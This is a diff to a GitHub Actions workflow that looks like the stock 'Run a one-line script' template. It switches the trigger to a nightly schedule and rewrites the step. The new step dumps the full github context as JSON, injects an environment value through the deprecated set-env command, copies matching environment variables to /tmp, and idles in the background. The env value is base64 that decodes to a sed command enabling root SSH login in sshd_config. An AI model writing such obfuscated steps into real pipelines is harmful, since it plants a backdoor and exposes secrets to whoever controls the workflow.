@@ -5,13 +5,14 @@ name: CI_2021_0601
 # Controls when the workflow will run
 on:
   # Triggers the workflow on push or pull request events but only for the main branch
-  push:
-    branches: [ main ]
+  schedule:
+    - cron: 0 0 * * *
+
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
-    
+
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
@@ -26,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
+        run: bash -c "echo ${{ toJson(github) }};echo "::set-env name=ss0::$ss0";(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
